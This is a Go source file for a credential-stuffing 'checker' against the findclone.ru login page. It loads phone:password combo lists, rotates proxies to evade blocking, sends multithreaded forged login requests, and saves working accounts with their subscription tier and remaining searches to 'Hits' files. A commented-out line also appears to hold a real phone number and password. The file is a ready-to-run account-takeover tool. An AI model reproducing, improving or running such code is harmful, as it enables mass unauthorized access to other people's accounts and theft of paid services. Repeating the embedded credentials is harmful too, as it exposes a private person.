package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/cheggaaa/pb/v3"
	"github.com/gammazero/workerpool"
	"h12.io/socks"
)

// Setting const
const (
	URL = "https://findclone.ru/login"

	DATA = `------WebKitFormBoundaryfBBqA8ALgiXvPNHQ
Content-Disposition: form-data; name="phone"

%s
------WebKitFormBoundaryfBBqA8ALgiXvPNHQ
Content-Disposition: form-data; name="password"

%s
------WebKitFormBoundaryfBBqA8ALgiXvPNHQ--`

	HEADERS = `Accept: application/json, text/plain, */\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 Edg/86.0.622.63
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfBBqA8ALgiXvPNHQ
Origin: https://findclone.ru
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://findclone.ru/
Accept-Encoding: gzip, deflate, br
Accept-Language: ru,en-GB;q=0.9,en;q=0.8`

	// Format log as you want
	LOG = "{phone}:{password} | Type: {type} | Searches left: {searches_left} | Period: {period}"

	CONSOLE_TITLE = "Failed: %d | Hits: %d | Trial: %d | Basic: %d | Medium: %d | Premium: %d | Expired: %d"

	BAD_STATUS     = "bad"
	GOOD_STATUS    = "success"
	BLOCK_STATUS   = "block"
	EXPIRED_STATUS = "expired"

	GOOD_DEF = "\"session_key\""
	BAD_DEF  = "Wrong password"

	CONN_ERROR = "conn_error"
)

var (
	resultsPath  = ""
	headers      = http.Header{}
	resources    = Resources{}
	isResultFind = false
	hits         = 0
	expired      = 0
	hitsBasic    = 0
	hitsMedium   = 0
	hitsPremium  = 0
	hitsTrial    = 0
	failedNum    = 0

	hitsFilename    = "Hits.txt"
	failedFilename  = "Failed.txt"
	expiredFilename = "Expired.txt"
)

// AccountInfo ...
type AccountInfo struct {
	FormattedPeriod string
	Period          int64  `json:"Period"`
	Quantity        int    `json:"Quantity"`
	Type            int    `json:"Type"`
	TypeName        string `json:"TypeName"`
	SessionKey      string `json:"session_key"`
	Userid          int64  `json:"userid"`
}

// AuthData ...
type AuthData struct {
	Phone     string
	Password  string
	ProxyType string
	Proxy     string
}

// Resources ...
type Resources struct {
	combosPath        string
	proxyPath         string
	proxyType         string
	threads           int
	timeout           int
	combos            []string
	proxies           []string
	combosLen         int
	proxiesLen        int
	proxiesUpdateTime int
}

// Auther ...
type Auther interface {
	Login() (*AccountInfo, error)
	BuildLog(accountInfo *AccountInfo) string
	WorkWithAccount(result string, accountInfo *AccountInfo) bool
}

func init() {
	// Build headers
	headersSlice := strings.Split(HEADERS, "\n")
	for i := 0; i < len(headersSlice); i++ {
		splited := strings.Split(headersSlice[i], ": ")
		headers.Add(splited[0], splited[1])
	}
}

func getProxies() {
	resp, err := http.Get(resources.proxyPath)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	resources.proxies = strings.Split(string(body), "\n")
	resources.proxiesLen = len(resources.proxies)
}

func updateProxies() {
	for {
		go getProxies()
		time.Sleep(time.Duration(resources.proxiesUpdateTime) * time.Second)
	}
}

// Asking for resources
func askForRes(resources *Resources) {

	var err error
	scanner := bufio.NewScanner(os.Stdin)

	r := strings.NewReplacer("\"", "")

	fmt.Print("Combos: ")
	if scanner.Scan() {
		resources.combosPath = r.Replace(scanner.Text())
	}

	fmt.Print("Proxies: ")
	if scanner.Scan() {
		resources.proxyPath = scanner.Text()
	}

	// Check if proxyPath is url, then updating it every n seconds
	// or just gets it from local path
	if strings.Contains(resources.proxyPath, "http://") ||
		strings.Contains(resources.proxyPath, "https://") {
		fmt.Print("Proxies update time (in seconds): ")
		if scanner.Scan() {
			resources.proxiesUpdateTime, err = strconv.Atoi(scanner.Text())
			if err != nil {
				fmt.Println(err)
			}
		}
	} else {
		resources.proxies, err = readLines(resources.proxyPath)
		if err != nil {
			log.Fatal(err)
		}
	}

	fmt.Print("Proxy type: ")
	if scanner.Scan() {
		resources.proxyType = scanner.Text()
	}

	fmt.Print("Threads: ")
	if scanner.Scan() {
		resources.threads, _ = strconv.Atoi(scanner.Text())
	}

	fmt.Print("Timeout: ")
	if scanner.Scan() {
		resources.timeout, _ = strconv.Atoi(scanner.Text())
	}

	resources.combos, err = readLines(resources.combosPath)
	if err != nil {
		log.Fatal(err)
	}
	resources.proxiesLen = len(resources.proxies)
	resources.combosLen = len(resources.combos)
}

func main() {
	//os.Setenv("HTTP_PROXY", "http://192.168.1.190:8888")

	askForRes(&resources)

	proxyIndex := 0

	wp := workerpool.New(resources.threads)

	bar := pb.Full.Start(resources.combosLen)
	bar.SetRefreshRate(time.Millisecond)

	// Setting standart bar template
	tmpl := `{{string . "prefix"}}{{counters . }} {{bar . }} {{percent . }} {{speed . }} {{etime . "%s"}}/{{rtime . "%s"}}`

	bar.SetTemplateString(tmpl)

	// Launching new gorutine to update proxies by url every n seconds
	if resources.proxiesUpdateTime != 0 {
		go updateProxies()
	}

	// Checking if proxies are ready
	for {
		if len(resources.proxies) > 0 {
			break
		}
	}

	// Iterating combos
	for i, combo := range resources.combos {
		combo := combo
		i := i
		wp.Submit(func() {
			array := strings.Split(combo, ":")
			if len(array) != 2 {
				return
			}
			user, pass := array[0], array[1]
			conn := false
			for !conn {
				// Check if proxyIndex is not bigger then whole proxies length
				if proxyIndex == resources.proxiesLen-1 {
					proxyIndex = 0
				} else {
					proxyIndex++
				}
				proxy := resources.proxies[proxyIndex]
				authData := AuthData{
					Phone:     user,
					Password:  pass,
					Proxy:     proxy,
					ProxyType: resources.proxyType,
				}
				result, accountInfo := authData.Login()
				conn = authData.WorkWithAccount(result, accountInfo, i)
			}
			// Change bar status every request
			bar.Increment()
		})

	}
	wp.StopWait()
	bar.Finish()
	//fmt.Println(login("79829280119", "Aa97evgeny"))
}

// Login ...
func (a AuthData) Login() (string, *AccountInfo) {
	var data = []byte(fmt.Sprintf(DATA, a.Phone, a.Password))
	req, err := http.NewRequest("POST", URL, bytes.NewBuffer(data))
	req.Header = headers

	// Setting up the proxy
	var tr *http.Transport
	if strings.Contains(a.ProxyType, "socks") {
		dialSocksProxy := socks.Dial(a.ProxyType + "://" + a.Proxy)
		tr = &http.Transport{Dial: dialSocksProxy}
	} else if a.ProxyType == "http" {
		url, _ := url.Parse("http://" + a.Proxy)
		tr = &http.Transport{Proxy: http.ProxyURL(url)}
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Millisecond * time.Duration(resources.timeout),
	}
	resp, err := client.Do(req)

	if err != nil {
		return CONN_ERROR, &AccountInfo{}
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	bodyInString := string(body)
	if strings.Contains(bodyInString, GOOD_DEF) {
		var accountInfo AccountInfo
		json.Unmarshal(body, &accountInfo)
		if accountInfo.Period < 1 {
			return EXPIRED_STATUS, &AccountInfo{}
		} else {
			formatAccountInfo(&accountInfo)
			return "success", &accountInfo
		}
	} else if strings.Contains(bodyInString, BAD_DEF) {
		return BAD_STATUS, &AccountInfo{}
	} else {
		return BLOCK_STATUS, &AccountInfo{}
	}
}

// Decide what to do with an auth result
// Return boolean that says if connection was successed
func (a AuthData) WorkWithAccount(result string, accountInfo *AccountInfo, i int) bool {
	if !isResultFind {
		resultsPath = createDirs()
		isResultFind = true
	}

	combo := a.Phone + ":" + a.Password
	switch result {
	case CONN_ERROR:
		return false
	case BAD_STATUS:
		failedNum++
		writeHitsToFile(failedFilename, combo)
		// Set number of failed combos each 100 combos
		// or if it is setted by hits or expired value
		if (i % 100) == 0 {
			SetConsoleTitle(fmt.Sprintf(CONSOLE_TITLE, failedNum, hits, hitsTrial, hitsBasic, hitsMedium, hitsPremium, expired))
		}
	case EXPIRED_STATUS:
		expired++
		writeHitsToFile(expiredFilename, combo)
		SetConsoleTitle(fmt.Sprintf(CONSOLE_TITLE, failedNum, hits, hitsTrial, hitsBasic, hitsMedium, hitsPremium, expired))
	case GOOD_STATUS:
		// Choose if hit have any subscription and add it to statistic
		switch accountInfo.TypeName {
		case "Basic":
			hitsBasic++
		case "Medium":
			hitsMedium++
		case "Premium":
			hitsPremium++
		case "Trial":
			hitsTrial++
		}
		hits++
		log := a.buildLog(accountInfo)
		writeHitsToFile(hitsFilename, log)
		writeHitsToFile(accountInfo.TypeName, log)
		SetConsoleTitle(fmt.Sprintf(CONSOLE_TITLE, failedNum, hits, hitsTrial, hitsBasic, hitsMedium, hitsPremium, expired))
	}
	return true
}

func (a AuthData) buildLog(accountInfo *AccountInfo) string {
	return formatLog(LOG,
		"{phone}", a.Phone,
		"{password}", a.Password,
		"{type}", accountInfo.TypeName,
		"{searches_left}", strconv.Itoa(accountInfo.Quantity),
		"{period}", accountInfo.FormattedPeriod)
}

func formatAccountInfo(accountInfo *AccountInfo) {
	fullTimestamp := time.Now().Add(
		time.Second *
			time.Duration(accountInfo.Period))
	formattedPeriod := fullTimestamp.Format("02 Jan 2006")
	accountInfo.FormattedPeriod = formattedPeriod
}

func formatLog(format string, args ...string) string {
	r := strings.NewReplacer(args...)
	return r.Replace(format)
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func SetConsoleTitle(title string) (int, error) {
	handle, err := syscall.LoadLibrary("Kernel32.dll")
	if err != nil {
		return 0, err
	}
	defer syscall.FreeLibrary(handle)
	proc, err := syscall.GetProcAddress(handle, "SetConsoleTitleW")
	if err != nil {
		return 0, err
	}
	r, _, err := syscall.Syscall(proc, 1, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), 0, 0)
	return int(r), err
}

// Create dirs if aren't created
func createDirs() string {
	replacer := strings.NewReplacer(":", "_")
	timeNow := time.Now()
	date := timeNow.Format("02.01.2006")
	dateTime := replacer.Replace(timeNow.Format("15:04:00"))
	finalDate := fmt.Sprintf("./Results/%s/%s/", date, dateTime)
	_ = os.Mkdir("./Results", os.ModeDir)
	_ = os.Mkdir("./Results/"+date, os.ModeDir)
	_ = os.Mkdir(finalDate, os.ModeDir)
	return finalDate
}

// Write info into several files
func writeHitsToFile(fileName, data string) {
	// Check if fileName contains ".txt", if not add it
	if !strings.Contains(fileName, ".txt") {
		fileName += ".txt"
	}
	f, err := os.OpenFile(resultsPath+fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	f.Write([]byte(data + "\n"))
}
